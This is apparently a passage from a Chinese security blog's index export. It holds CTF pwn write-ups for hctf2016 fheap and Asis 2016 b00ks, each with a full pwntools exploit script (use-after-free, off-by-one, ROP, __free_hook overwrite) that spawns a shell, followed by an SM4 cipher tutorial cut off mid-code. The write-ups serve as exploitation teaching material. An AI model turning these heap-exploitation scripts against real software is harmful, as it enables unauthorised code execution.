*0x4008F4")# 泄漏堆指针 gets(0,0,'n0va_0')gets(0,1,'n0va_1')free(0)free(1)free(0)puts(0)heap = u64(p.recvuntil('\x0a')[:-1].ljust(8,'\x00'))print "heap --&gt; " + hex(heap)#---------------------------------------------------# gdb.attach(p,"b *0x4008F4")gets(0,0x68,'n0va_2')gets(1,0x68,'n0va_3')gets(2,0,'aaaa')gets(3,0,'/bin/sh') # heap的位置 # double free 将fack_chunk链到 0号后面,即 0-&gt;fd = fadc_chunkfree(0)free(1)free(0)gets(0,0x68,p64(fack_chunk))gets(1,0x68,'n0va')gets(0,0x68,p64(fack_chunk))payload = 'a'*0x13 + p64(0x400856)# gdb.attach(p,"b *0x4008F4")gets(3,0x68,payload)# heap + 0x10 '/bin/sh'的位置 gets(4,heap+0x10,'yes?')p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hctf2016-fheap]]></title>
    <url>%2F2019%2F05%2F08%2Fhow2heap%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[题目介绍程序只有两个功能： 121.create string2.delete string 1、create 功能 先申请一个0x20大小的堆空间，接着输入字符串，如果字符长度&lt;0xf那么直接放入ptr里，如果 &gt;0xf 则再申请适合长度的堆空间存字符，然后将指针存到ptr中，最后会将堆的free函数存储在堆存储结构的后8字节处，如下图 2、delete 函数调用存储在结构体里的free_func指针来释放堆 由于free时没有将指针置空，出现了释放后仍可利用的现象，即uaf 利用思路查看保护机制 可以看到保护全开，所以在解题过程中要先绕过PIE。 思路：首先利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请三个字符长度小于0xf 的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下图： 那么此时再创建一个字符长度为0x20的字符串，则申请出来的堆结构会是如下图 此时就可以将1号堆块的free_func指针覆盖为任意内容，指向我们需要执行的函数，随后再调用1号块的free_func函数，实现劫持函数流的目的。 利用过程1、绕过PIE在能劫持函数流之后 ，首先是泄露出程序的地址以绕过PIE，具体方法是：将free_func的低位覆盖为0x2d，去执行puts函数，打印出free_func的地址从而得到程度基地址。 2、泄露真实地址得到基地址后，下一步要做的就是泄露真实地址了，puts函数执行完后程序回到了0xc71处，此时fastbin中只有2号堆块，所以要先释放0号堆块，释放完后3个堆块都处理空闲状态了，此时查看栈中的情况会发现，在delete中输入的yes其实是存储在栈中的，而且，可读入0x100个字节。 这样，我们就可以在栈上布局rop链达到劫持程序流的目的， 我们可以找到pop_pop_pop_pop这样的gadget将栈顶的4个元素弹出，’yes’之后便是返回地址。再调用puts函数打印出puts_got得到puts的真实地址。再利用同样的方式调用system(‘/bin/sh’) EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *from ctypes import *context.log_level = 'debug'p = process('./pwn-f')elf = ELF('./pwn-f')libc = elf.libc#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def create(size, string,isdebug): p.recvuntil('3.quit\n') p.sendline('create ') p.recvuntil('Pls give string size:') p.sendline(str(size)) p.recvuntil('str:') if isdebug: debug(0xf76,1) p.send(string + '\x00')def delete(id,isdebug): p.recvuntil('3.quit\n') p.sendline('delete ') p.recvuntil('id:') p.sendline(str(id)) p.recvuntil('Are you sure?:') if isdebug: debug(0xe37,1) p.sendline('yes')def quit(): p.recvuntil('3.quit\n') p.sendline('quit ')create(15,'aaa\n',0)create(15,'bbb\n',0)create(15,'ccc\n',0)delete(2,0)delete(1,0)delete(0,0)# debug(0xee2)create(0x20,'a'*24+'\x2d',0)# debug(0xd95,1)delete(1,1)p.recvuntil('a'*24)elf_base = u64(p.recv(6).ljust(8,'\x00')) - 0xd2dprintf_plt = elf_base + 0x9d0puts_plt = elf_base + 0x990puts_got = elf_base + 0x202030print "elf_base --&gt; " + hex(elf_base)print "printf_plt --&gt; " + hex(printf_plt)print "puts_plt --&gt; " + hex(puts_plt)pause()pop_4 = 0x11dc + elf_basepop_rdi = 0x11e3 + elf_baseprint "pop_4 --&gt; " + hex(pop_4)# pause()delete(0,0)payload = 0x18*'a'payload += p64(pop_4)create(0x20,payload,0)p.recvuntil('3.quit\n')p.sendline('delete ')p.recvuntil('id:')p.sendline('1')p.recvuntil('Are you sure?:')temp = 'yesaaaaa'temp += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)temp += p64(0xc71 + elf_base)p.sendline(temp)puts_addr = u64(p.recv(6).ljust(8,'\x00'))print "puts_addr --&gt; " + hex(puts_addr)offset = puts_addr - libc.symbols['puts']onegadget = offset + 0x45216# print "onegadget --&gt; " + hex(onegadget)system_addr = offset + libc.symbols['system']binsh_addr = offset + libc.search('/bin/sh').next()print "system_addr --&gt; " + hex(system_addr)print "binsh_addr --&gt; " + hex(binsh_addr)pause()delete(0,0)payload = 0x18*'a'payload += p64(pop_4)create(0x20,payload,0)p.recvuntil('3.quit\n')p.sendline('delete ')p.recvuntil('id:')p.sendline('1')p.recvuntil('Are you sure?:')temp = 'yesaaaaa'temp += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)p.sendline(temp)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Off-By-One之Asis CTF 2016 b00s]]></title>
    <url>%2F2019%2F05%2F04%2FOff-By-One%E4%B9%8BAsis%20CTF%202016%20b00s%2F</url>
    <content type="text"><![CDATA[题目介绍题目是一个表单程序，功能是一个图书管理系统。 12345671. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt; 程序提供了创建、删除、编辑、打印、修改author name的功能，除了 canary 外，其他保护全开 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 首先程序会要求输入author name，存到bss 段 unk_202040 中，限制大小为32，用自己构造的函数读取，接下来看create函数的功能：输入book name’s size 然后 malloc(size) ，读入name，限制长度是32，接着输入description’s size 也同样malloc(size)，读入description，不限制长度。接下来为book结构体申请一个0x20的空间 12345678910book = malloc(0x20uLL);if ( book )&#123; *(book + 6) = size; *(book_addr + id) = book; *(book + 2) = description; *(book + 1) = name; *book = ++unk_202024; return 0LL;&#125; book结构体的指针会存到unk_202060处，也就是authon name 紧跟着的后面 漏洞程序的主要漏洞就存在其自己构造的read函数中，因为对边界处理不当，导致写入时存在1个字节的溢出，即off-by-one 123456789101112131415161718192021signed __int64 __fastcall my_read(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 事实上，当写入author name最长长度32时，my_read 读入的结束符&#39;\x00&#39;是写到0x56260bc1b060上的，即unk_202040 + unk_202060也就是book_addr ，那么，当写入book1时，’\x00’就会被覆盖为book1的地址，通过打印author name就可以获得一个堆地址book1_addr。 12345678910111213pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x0000000000000000 0x00000000000000000x56260bc1b070: 0x0000000000000000 0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000-------------------------------------------------------------------------------------------------pwndbg&gt; x/10gx 0x56260bc1b0400x56260bc1b040: 0x6161616161616161 0x61616161616161610x56260bc1b050: 0x6161616161616161 0x61616161616161610x56260bc1b060: 0x000056260bd2e160 0x00000000000000000x56260bc1b070: 0x0000000000000000 0x00000000000000000x56260bc1b080: 0x0000000000000000 0x0000000000000000 off-by-one 覆盖指针低字节程序提供了一个change 功能，用于修改author name，所以可以通过修改author name 将book1的低字节覆盖为’\x00’，覆盖之后这个指针会指向book1 的 description ，程序同样也提供了edit功能修改description中的内容，所以我们可以在description 中布置数据伪造一个book结构，这个book结构 中的name 和 description 指针均可以直接抑制。 再次调用printf()函数打印将可直接得到book2_name_addr （这里需要注意的是，对于book2需要申请一个非常大的空间，才能使用堆块mmap分配，才能够泄漏libc base addr）在gdb中下断，用得到的book2_name_addr - libcbase 即可得到到libcbase 的偏移，这个偏移是不变的，而且每个人的环境不同偏移也可能不一样，这样就拿到了libcbase了。 因为程序开户了RELOR，got表不可改，但是可以改写__free_hook或__malloc_hook结合前面泄漏的libcbase可以得到onegadget 地址，最后通过修改book1跟book2的description实现任意地址写，将__free_hook内容写入为onegadget，free即可调用onegadget（free时，如果 __free_hook不为空，即执行free_hook） exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8from pwn import *#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./b00ks')elf = ELF('./b00ks')libc = elf.libccontext.log_level = 'debug'def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(name_size)) p.recvuntil('(Max 32 chars): ') p.sendline(name) p.recvuntil('size: ') p.sendline(str(des_size)) p.recvuntil('description: ') # debug(0x10B7,1) p.sendline(des)def printf(): p.recvuntil('&gt; ') # debug(0xd56,1) p.sendline('4')def editbook(book_id,new_des,a): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.writeline(str(book_id)) p.recvuntil(': ') if a: debug(0xf30,1) p.sendline(new_des)def change_author_name(): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('name: ') debug(0xb99,1) p.sendline('a'*32)def delete(id): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('Enter the book id you want to delete: ') p.sendline(str(id))p.recvuntil('name: ')p.sendline('a'*32)create(142,'n0va',142,'n0va')create(0x21000,'book2_name2',0x21000,'book2_des')# create(32,'n0va',32,'n0va')printf()# pause()p.recvuntil('a'*32)book1_addr = u64(p.recv(6).ljust(8,'\x00'))book2_addr = book1_addr + 0x30print "book1_addr --&gt; " + hex(book1_addr)print "book2_addr --&gt; " + hex(book2_addr)# book1_addr + 0x38 = book2_name# book1_addr + 0x40 = book2_despayload = 'a'*0x40 + p64(1) + p64(book1_addr+0x38) + p64(book1_addr+0x40) + p64(0xffff)editbook(1,payload,0)change_author_name()printf()p.recvuntil('Name: ')book2_name_addr = u64(p.recv(6).ljust(8,'\x00'))p.recvuntil('Description: ')book2_des_addr = u64(p.recv(6).ljust(8,'\x00'))print "book2_name_addr --&gt; " + hex(book2_name_addr)print "book2_des_addr --&gt; " + hex(book2_des_addr)pause()offset = 0x5ac010 #泄漏出来的地址（即book2_name_addr)跟 libcbase的偏移，不同环境这个值会不同libcbase = book2_name_addr - offsetfree_hook = libc.symbols['__free_hook'] + libcbasesystem = libc.symbols['system'] + libcbaseonegadget = libcbase + 0x4526abinsh_addr = libc.search('/bin/sh').next() + libcbaseprint "free_hook --&gt; " + hex(free_hook)print "system --&gt; " + hex(system)print "binsh_addr --&gt; " + hex(binsh_addr)print "onegadget --&gt; " + hex(onegadget)# pause()payload = p64(free_hook) + p64(free_hook)editbook(1,payload,0)payload = p64(onegadget)editbook(2,payload,0)delete(2)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[国密加密算法sm4]]></title>
    <url>%2F2019%2F04%2F25%2Fsm4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[概述SM4加密算法属于对称加密算法，2012年3月，国家密码管理局正式公布了包含SM4分组密码算法在内的《祖冲之序列密码算法》等6项密码行业标准。与DES和AES算法类似，SM4算法是一种分组密码算法。其分组长度为128bit，密钥长度也为128bit。加密算法与密钥扩展算法均采用32轮非线性迭代结构，以字（32位）为单位进行加密运算，每一次迭代运算均为一轮变换函数F。SM4算法加/解密算法的结构相同，只是使用轮密钥相反，其中解密轮密钥是加密轮密钥的逆序。 SM4算法结构图：(图片来源网上) 参数介绍​ 1、字节：由8位2进制数表示 ，字：由32位2进制数表示； ​ 2、S盒：固定的8bit输入、输出转换数组； ​ 3、加密密钥长度为128bit，表示为MK=（MK0,MK1,MK2,MK3），其中MKi为字。轮密钥表示为rki(i=0,1,2,3……31)为字。FK = (FK0,FK1,FK2,FK3)为系统 参数,CK = (CK0,CK1,CK2,……,CK31)为固定参数，都为字。 加密加密原理这里就不讲了，网上有不少详细的文章，下面直接开始算法的实现。 在开始加密算法之前，先介绍几个宏定义： 123456789101112131415161718192021222324//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))//交换#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; 密钥调试算法先建立一个结构体来保存上下文信息，即加密模式和各轮子密钥：(这个结构体我是定义在sm4.h头文件中) 123456typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; 首先需要设置密钥，调用sm4_setkey_enc(&amp;ctx,key);函数，这个函数会设置mode为加密，并调用sm4_setkey(ctx-&gt;sk,key);函数来完成密钥的操作 12345678910111213141516171819202122void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; //先通过宏将初始的密钥转换为4个32位bit的整数，并为计算各轮密钥预先准备好初始值 GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125; 对于第i轮的密钥SK[i]，其是由k[i]和对k[i+1]^k[i+2]^k[i+3]^CK[i]的复合变换T‘异或得到的： SK[i] = k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]);函数sm4CaliRk就是变换T’,先进行Sbox的非线性替换，然后进行线性变换，线性变换L为：rk = bb^(ROTL(bb, 13))^(ROTL(bb, 23)); 123456789101112131415static unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125; 至此，密钥就已经生成了 加密过程调用函数void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)对密文input进行电码本模式加密(ECB)，加密的核心是调用了static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )函数对第一块密文进行加密 1234567891011121314151617181920212223242526272829303132333435363738394041void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125; sm4_one_round()函数中，先将128位的输入input转为四个32位的整数，放入ulbuf[4]中，然后迭代地调用函数static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)进行32轮加密，第一轮加密都需要使用之前的128位的结果ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3]和该轮的密钥 sk[i]，产生出该轮的密文ulbuf[i+4]，最后的密文存储在ulbuf[35]~ulbuf[32]中，转换为字符数组形式放入output 中。 12345//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125; sm4Lt()是一个合成变换，由非线性变换t和线性变换L复合而成：首先将输入的整数 ka 转换为8比特一个的字符，然后使用S盒进行线性变换，再将变换结果转为32比特的整数，最后对得到的32位整数bb进行线性变换：c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); 12345678910111213141516171819static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125; 整个加密过程就结束了，不过上面提到的是ECB的加密模式：又称电子密码本模式：Electronic codebook，是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。这种加密不能很好地隐藏数据模式。 SM4常见的也有另一种加密模式：CBC：密码分组链接（CBC，Cipher-block chaining）模式，由IBM于1976年发明，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV。 1234567891011121314151617181920212223242526272829303132333435363738394041424344//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; 解密过程解密前，首先要通过void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )函数设定解密时使用的key，这个函数还会将密钥的顺序倒置，然后调用sm4_crypt_ecb()即可解密。 实际上，SM4的解密变换与加密变换结构相同，不同的仅仅是轮密钥的使用顺序相反。 完整的代码sm4.h文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100/** * \file sm4.h */#ifndef XYSSL_SM4_H#define XYSSL_SM4_H #define SM4_ENCRYPT 1#define SM4_DECRYPT 0#ifndef GET_ULONG_BE//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; /** * \brief SM4 context structure */typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; #ifdef __cplusplusextern "C" &#123;#endif /** * \brief SM4 key schedule (128-bit, encryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_enc( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4 key schedule (128-bit, decryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4-ECB block encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param input input block * \param output output block */void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output); /** * \brief SM4-CBC buffer encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param iv initialization vector (updated after use) * \param input buffer holding the input data * \param output buffer holding the output data */void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output ); #ifdef __cplusplus&#125;#endif #endif /* sm4.h */ sm4.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229#include &lt;iostream&gt;#include &lt;string.h&gt;#include "sm4.h"using namespace std; //S盒 const unsigned char Sbox[256] = &#123; 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48 &#125;;//CK为固定参数 const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//FK为系统参数 static const unsigned long FK[4] = &#123;0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc&#125;;static unsigned char sm4Sbox(unsigned char inch)&#123; unsigned char *pTable = (unsigned char *)Sbox; unsigned char retVal = (unsigned char)(pTable[inch]); return retVal;&#125;//已知加密密钥MK，求轮转密钥rkstatic unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125;void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = 